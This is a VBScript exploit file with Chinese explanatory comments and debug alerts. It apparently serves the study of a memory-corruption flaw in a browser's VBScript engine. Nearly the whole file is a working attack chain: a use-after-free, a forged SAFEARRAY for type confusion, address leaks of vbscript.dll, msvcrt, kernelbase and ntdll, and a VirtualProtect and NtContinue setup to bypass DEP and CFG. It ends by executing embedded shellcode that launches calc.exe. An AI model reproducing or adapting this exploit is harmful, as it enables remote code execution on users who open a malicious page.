
Dim array_a
Dim array_b(6),array_c(6)
Dim spec_int_2
Dim array(40)
Dim str_1,str_2
Dim spec_int_1
Dim cla4_obj1,cla4_obj2
Dim cla6_obj1,cla7_obj1
Dim NtContinueAddr,VirtualProtectAddr
 
spec_int_1=195948557			'&hBADF00D
'此字符串是刻意伪装成一个长度为7fffffff的safearray，为变换它的类型做准备
str_1=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
str_2=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
spec_int_2=	195890093			'&hBAD0BAD

'shellcode两个函数进行加密混淆
Function IIIII(Domain) 
    lIlII=0
    IllllI=0
    IIlIIl=0
    Id=CLng(Rnd*1000000)
    lIlII=CLng((&h27d+8231-&H225b)*Rnd)Mod (&h137d+443-&H152f)+(&h1c17+131-&H1c99)
    If(Id+lIlII)Mod (&h5c0+6421-&H1ed3)=(&h10ba+5264-&H254a) Then
        lIlII=lIlII-(&h86d+6447-&H219b)
    End If
 
    IllllI=CLng((&h2bd+6137-&H1a6d)*Rnd)Mod (&h769+4593-&H1940)+(&h1a08+2222-&H2255)
    IIlIIl=CLng((&h14e6+1728-&H1b5d)*Rnd)Mod (&hfa3+1513-&H1572)+(&h221c+947-&H256e)
    IIIII=Domain &"?" &Chr(IllllI) &"=" &Id &"&" &Chr(IIlIIl) &"=" &lIlII
End Function
 
Function lIIII(ByVal lIlIl)
    IIll=""
    For index=0 To Len(lIlIl)-1
        IIll=IIll &ToHexString(Asc(Mid(lIlIl,index+1,1)),2)
    Next
    IIll=IIll &"00"
    If Len(IIll)/(&h15c6+3068-&H21c0) Mod (&h1264+2141-&H1abf)=(&hc93+6054-&H2438) Then
        IIll=IIll &"00"
    End If
    For i=(&h1a1a+3208-&H26a2) To Len(IIll)/(&h1b47+331-&H1c8e)-(&h14b2+4131-&H24d4)
        liI=Mid(IIll,i*(&h576+1268-&Ha66)+(&ha64+6316-&H230f),(&ha49+1388-&Hfb3))
        lIlIll=Mid(IIll,i*(&hf82+3732-&H1e12)+(&h210+2720-&Hcaf)+(&h4fa+5370-&H19f2),(&hf82+5508-&H2504))
        lIIII=lIIII &"%u" &lIlIll &liI
    Next
End Function
Function ToHexString(ByVal Number,ByVal Length)
    IIII=Hex(Number)
    If Len(IIII)<Length Then
        IIII=String(Length-Len(IIII),"0") &IIII    'pad allign with zeros 
    Else
        IIII=Right(IIII,Length)
    End If
    ToHexString=IIII
End Function

'函数参数为对象地址，然后该函数返回的是这个对象的虚函数表地址
Function GetUint32(addr)					'返回虚函数表地址
    Dim value
	IsEmpty("enter GetUint32")
    cla4_obj1.mem(spec_int_1+8)=addr+4		'原本存放CScriptEntryPoint对象的位置存放该地址+4
	IsEmpty("spec_int_1+8")
    cla4_obj1.mem(spec_int_1)=8        '改为字符串 type string
	IsEmpty("type string")
    value=cla4_obj1.P0123456789			'P0123456789得到虚函数表地址
	IsEmpty(value)
    cla4_obj1.mem(spec_int_1)=2			'改为 整型 type vbInteger
	IsEmpty("type vbInteger")
    GetUint32=value					
End Function

Function GetWord(addr)
    GetWord=GetUint32(addr) And (131071-65536)
End Function
Function lllII(addr)
    lllII=GetUint32(addr)  And (&h17eb+1312-&H1c0c)
End Function

Sub EmptySub
End Sub

Function GetMemValue
    cla4_obj1.mem(spec_int_1)= 3				'将CScriptEntryPoint对象 的类型改为3 即为Long
    GetMemValue=cla4_obj1.mem(spec_int_1+ 8)
	
	Alert "GetMemValue Finish "
	IsEmpty(spec_int_1)
End Function


Sub SetMemValue(ByRef Ili)
    cla4_obj1.mem(spec_int_1+8)=Ili  			'将对象放到指定区域
	Alert "SetMemValue Finish "
	IsEmpty(spec_int_1)
    
End Sub

'此函数泄露CScriptEntryPoint对象的虚函数表地址，该地址属于Vbscript.dll。
Function LeakVBAddr
    On Error Resume Next						'忽略错误，执行下一条代码
    Dim emptySub_addr_placeholder				'构造一个类型为null 的 CScriptEntryPoint 对象
    emptySub_addr_placeholder=EmptySub
    emptySub_addr_placeholder=null
    IsEmpty(emptySub_addr_placeholder)			'此断点可以查看此CScriptEntryPointObject地址
    SetMemValue emptySub_addr_placeholder		'这种传参数不用括号也是可以的
    LeakVBAddr=GetMemValue()
End Function

'参数为虚函数表地址
Function FindMzBase(vtable_address)

    Dim base
    base=vtable_address And &hffff0000		'尾数清零--1,得到vbscript.dll 基地址
	Alert "FindMzBase "
	'IsEmpty(base)
	
    Do While GetUint32(base+&h68)<>&h206E6920 Or GetUint32(base+&h6c)<>&h20534F44
        base=base-&h10000					
    Loop
	'IsEmpty(base)
    FindMzBase=base
End Function

Function StrCompWrapper(name_addr,to_compare)
    Dim name,i
    name=""
    For i=(&ha2a+726-&Hd00) To Len(to_compare)-(&h2e1+5461-&H1835)
        name=name &Chr(lllII(name_addr+i))
    Next
    StrCompWrapper=StrComp(UCase(name),UCase(to_compare))
End Function

'遍历导入表 找到导入的其余dll的地址，参数，基地址，与dll名称
Function GetBaseFromImport(base_address,name_input)
    Dim import_rva,nt_header,descriptor,import_dir
    Dim dlladdr_rva
    nt_header=GetUint32(base_address+(&h3c))
    import_rva=GetUint32(base_address+nt_header+&h80)
    import_dir=base_address+import_rva
    descriptor=0
    Do While True
        Dim Name
        Name=GetUint32(import_dir+descriptor*(&h14)+&hc)
        If Name=0 Then
            GetBaseFromImport=&hBAAD0000
            Exit Function
        Else
            If StrCompWrapper(base_address+Name,name_input)=0 Then
                Exit Do
            End If
        End If
        descriptor=descriptor+1
    Loop
    dlladdr_rva=GetUint32(import_dir+descriptor*(&h14)+&h10)
    GetBaseFromImport=FindMzBase(GetUint32(base_address+dlladdr_rva))
End Function
 
Function GetProcAddr(dll_base,name)
    Dim p,export_dir,index
    Dim function_rvas,function_names,function_ordin
    Dim ordinal
    p=GetUint32(dll_base+&h3c)
    p=GetUint32(dll_base+p+&h78)
    export_dir=dll_base+p
 
    function_rvas=dll_base+GetUint32(export_dir+&h1c)
    function_names=dll_base+GetUint32(export_dir+&h20)
    function_ordin=dll_base+GetUint32(export_dir+&h24)
    index=0
    Do While True
        Dim lllI
        lllI=GetUint32(function_names+index*4)
        If StrCompWrapper(dll_base+lllI,name)=0 Then
            Exit Do
        End If
        index=index+1
    Loop
    ordinal=GetWord(function_ordin+index*2)
    p=GetUint32(function_rvas+ordinal*4)
    GetProcAddr=dll_base+p
End Function
 
Function GetShellcode()
    result=Unescape("%u0000%u0000%u0000%u0000") &Unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100%u0065%u0000%u0000%u0000%u0000%u0000%ucc00%ucccc%ucccc%ucccc%ucccc" &lIIII(IIIII("")))
	
	
	
	IsEmpty(result)
    result=result & String((&h80000-LenB(result))/2,Unescape("%u4141"))
    GetShellcode=result
	IsEmpty(GetShellcode)
	
	
End Function


Function EscapeAddress(ByVal value)
    Dim High,Low
    High=ToHexString((value And &hffff0000)/&h10000,4)
    Low=ToHexString(value And &hffff,4)
    EscapeAddress=Unescape("%u" &Low &"%u" &High)
End Function


Function StructWithNtContinueAddr
    Dim i,ntContinueAddrAsStr,result,a1,a2,a3,a4
    ntContinueAddrAsStr=ToHexString(NtContinueAddr,8)
    a1=Mid(ntContinueAddrAsStr,1,2)
    a2=Mid(ntContinueAddrAsStr,3,2)
    a3=Mid(ntContinueAddrAsStr,5,2)
    a4=Mid(ntContinueAddrAsStr,7,2)
    result=""
    result=result &"%u0000%u" &a4 &"00"
    For i=1 To 3
        result=result &"%u" &a2 &a3
        result=result &"%u" &a4 &a1
    Next
    result=result &"%u" &a2 &a3
    result=result &"%u00" &a1
    StructWithNtContinueAddr=Unescape(result)
End Function

'构造VirtualProtect环境 参数为shellcode地址		
Function VirtualProtectCallParameters(ShellcodeAddrParam) 'bypass cfg
	Alert "VirtualProtectCallParameters"
    Dim result
	IsEmpty(result)
    result=String((100334-65536),Unescape("%u4141"))					'重复0x10FDC个“A”
	IsEmpty(result)
	
    result=result &EscapeAddress(ShellcodeAddrParam)		'在0FDC个“A”后面放入shellcode地址
	IsEmpty(result)
    result=result &EscapeAddress(ShellcodeAddrParam)		'第一个参数	修改的基地址
	IsEmpty(result)
    result=result &EscapeAddress(&h3000)					'第二个参数	size
	IsEmpty(result)
    result=result &EscapeAddress(&h40)						'第三个参数PAGE_EXECUTE_READWRITE 0x40
	IsEmpty(result)
    result=result &EscapeAddress(ShellcodeAddrParam-8)		'第四个，内存原始属性保存地址
	IsEmpty(result)
    result=result &String(6,Unescape("%u4242"))				'重复 6个“**”
	IsEmpty(result)
    result=result &StructWithNtContinueAddr()				' \x00 * 3  NtContinue * 4 \x00
	IsEmpty(result)
    result=result &String((&h80000-LenB(result))/2,Unescape("%u4141")) '重复 0x80000-result(当前有效的)个“AA”
	IsEmpty(result)
    VirtualProtectCallParameters=result
End Function

'构造NtContinue环境,参数为VirtualProtectCallParameters构造的内存
Function ExpandWithVirtualProtect(structForVirtualProtect)
	Alert "ExpandWithVirtualProtect"
    Dim result
    Dim ntContinuePtr
    ntContinuePtr=structForVirtualProtect+&h23		'加的23是NtContinue地址
	IsEmpty(ntContinuePtr)
    result=""
    result=result &EscapeAddress(ntContinuePtr)
	IsEmpty(result)
    result=result &String((&hb8-LenB(result))/2,Unescape("%4141"))	'构造CONTEXT结构体
	IsEmpty(result)
    result=result &EscapeAddress(VirtualProtectAddr)	'//加入 VirtualProtect 地址
	IsEmpty(result)
    result=result &EscapeAddress(&h1b)
	IsEmpty(result)
    result=result &EscapeAddress(0)
	IsEmpty(result)
    result=result &EscapeAddress(structForVirtualProtect)
	IsEmpty(result)
    result=result &EscapeAddress(&h23)
	IsEmpty(result)
    result=result &String((&400-LenB(result))/2,Unescape("%u4343"))
	IsEmpty(result)
    ExpandWithVirtualProtect=result
End Function

Sub ExecuteShellcode
    cla4_obj1.mem(spec_int_1)=&h4d 		'DEP bypass
    cla4_obj1.mem(spec_int_1+8)=0		'后面的已经没用了
	IsEmpty(spec_int_1)
    msgbox(spec_int_1)        			'VT replaced
End Sub
 
Class Trigger
Private Sub Class_Terminate()
    Set array_b(spec_int_2)=array_a(1)
    spec_int_2=spec_int_2+1
    array_a(1)=1
End Sub
 
End Class
 
Class cla2
Private Sub Class_Terminate()
    Set array_c(spec_int_2)=array_a(1)
    spec_int_2=spec_int_2+1
    array_a(1)=1
End Sub
End Class
 
Class Foo
End Class
 
Class cla4
    Dim mem
    Function P
    End Function
    Function SetProp(Value)
        IsEmpty("Enter cla4:SetPro")
        mem=0
        mem=Value				'分别会调用cla6与cla7的Get P  返回值P 保存在 mem 中
        SetProp=0
    End Function
End Class
 
Class cla6
    Public Default Property Get P				'Property Get 语句 用来取得（返回）的值	 	
        IsEmpty("cal6:call Get P")
        Dim cla5_obj1
		'CDbl是转换成双精度浮点数据类型
		'dd 00000005 00000000 00000000 0000200C
        P=CDbl("174088534690791e-324")			'对cla4_mem赋值，把string改为array类型
								
        For i=0 To 6			'array_b原本保存了Trigger的引用，而Trigger被释放后是由
            array_b(i)=0		'cla4_obj1占位的。array_b赋值为0，也就是将cla4_obj1的内存释放了
        Next
        IsEmpty("finish set array_b to 0")
		
        Set cla5_obj1=New cla5		'再次使用悬垂指针重新用cla5_obj1占位，
        cla5_obj1.mem=str_1			'并对cla5.mem赋值伪造的字符串 7fffffff的safearray，
		
        IsEmpty(cla5_obj1)
        For i=0 To 6
            Set array_b(i)=cla5_obj1
        Next
    End Property
End Class
 

 
 
Class cla5
    Dim mem
    Function P0123456789
        P0123456789=LenB(mem(spec_int_1+8))		'是怎么获得虚函数表地址的
    End Function
    Function SPP
    End Function
End Class
 
Class cla7
    Public Default Property Get P
        Dim cla5_obj1
		' dd 00000005 00000000 00000000 00000003
        P=CDbl("636598737289582e-328")
        For i=0 To 6
            array_c(i)= 0
        Next
        IsEmpty("finish set array_c to 0")
        Set cla5_obj1=New cla5
        cla5_obj1.mem=str_2
        IsEmpty(cla5_obj1)
        For i= 0 To 6
            Set array_c(i)=cla5_obj1
        Next
    End Property
End Class
 
Set cla6_obj1=New cla6
Set cla7_obj1=New cla7

'申请空间，占位
Sub UAF
	Alert "UAF"
    For i=0 To 19
        Set array(i)=New Foo			'占据系统堆碎片
    Next
    For i=20 To 39
        Set array(i)=New cla4			'占据系统堆碎片
    Next

	
    spec_int_2=0						
    For i=0 To 6
        ReDim array_a(1) 
        Set array_a(1)=New Trigger		
        Erase array_a					'array_b保存了对已经释放的Trigger obj的引用
    Next
	
    IsEmpty(array_b)					'引用计数为0时为什么没有调用release 完全释放类对象					
	
    Set cla4_obj1=New cla4				'同时 cla4_obj1 对它占位
    IsEmpty(cla4_obj1)
	
    spec_int_2=0
    For i=0 To 6
        ReDim array_a(1)
        Set array_a(1)=New cla2			'array_c保存了对已经释放的 cla2 obj 的引用
        Erase array_a						
    Next
    IsEmpty(array_c)
    Set cla4_obj2=New cla4				'同时 cla4_obj2 对它占位
    IsEmpty(cla4_obj2)
End Sub

'构造数据结构，类型混淆
Sub InitObjects
	'Alert "InitObjects"
    IsEmpty(cla4_obj1)
    cla4_obj1.SetProp(cla6_obj1)		'会调用class6的Get P,完成了string--->array的类型转换
    IsEmpty(cla4_obj1)
    
    IsEmpty(cla4_obj2)
    cla4_obj2.SetProp(cla7_obj1)		'会调用class7的Get P,完成了string--->long的类型转换
    IsEmpty(cla4_obj2)
	
	'Alert "InitObjects2"
	
    spec_int_1=cla4_obj2.mem	'这句将上面指向0000的那个字符串的指针泄露给了spec_int_1
	IsEmpty(spec_int_1)
    
End Sub
 
Sub StartExploit
    UAF
    InitObjects
    vb_adrr=LeakVBAddr()
    
    IsEmpty(vb_adrr)
    Alert "CScriptEntryPointObject Leak: 0x" & Hex(vb_adrr) & vbcrlf & "VirtualTable address: 0x" & Hex(GetUint32(vb_adrr))
	
	'首先得到VBScript地址，其传入的是CScriptEntryPoint虚函数表对象地址
    vbs_base=FindMzBase(GetUint32(vb_adrr))
    Alert "VBScript Base: 0x" & Hex(vbs_base) 
	
	'遍历VBScript.dll导入表找到msvcrt.dll基地址
    msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
    Alert "msvcrt Base: 0x" & Hex(msv_base) 
	
	'遍历msvcrt.dll导入表找到kernelbase.dll基地址
    krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
    Alert "KernelBase Base: 0x" & Hex(krb_base) 
	
	'遍历msvcrt.dll导入表找到ntdll.dll基地址
    ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
    Alert "Ntdll Base: 0x" & Hex(ntd_base) 
	
	'从kernelbase.dll找到VirtualProtect函数地址
    VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
    Alert "KernelBase!VirtualProtect Address 0x" & Hex(VirtualProtectAddr) 
	
	'从ntdll.dll找到 NtContinue 函数地址
    NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
    Alert "Ntdll!NtContinue Address 0x" & Hex(NtContinueAddr) 
	
	'先搞清楚关键dll-------------------然后shellcode----------------------------

	Alert "GetShellcode"
    SetMemValue GetShellcode()
    ShellcodeAddr=GetMemValue()+8
    IsEmpty(ShellcodeAddr)
   ' Alert "Shellcode Address 0x" & Hex(ShellcodeAddr) 
   
   

   
   
    SetMemValue VirtualProtectCallParameters(ShellcodeAddr)
    lIlll=GetMemValue()+69596	'0x10FDC
	IsEmpty(lIlll)
    SetMemValue ExpandWithVirtualProtect(lIlll)
    llIIll=GetMemValue()
	IsEmpty(llIIll)
	Alert "Executing Shellcode"
    ExecuteShellcode
End Sub
StartExploit
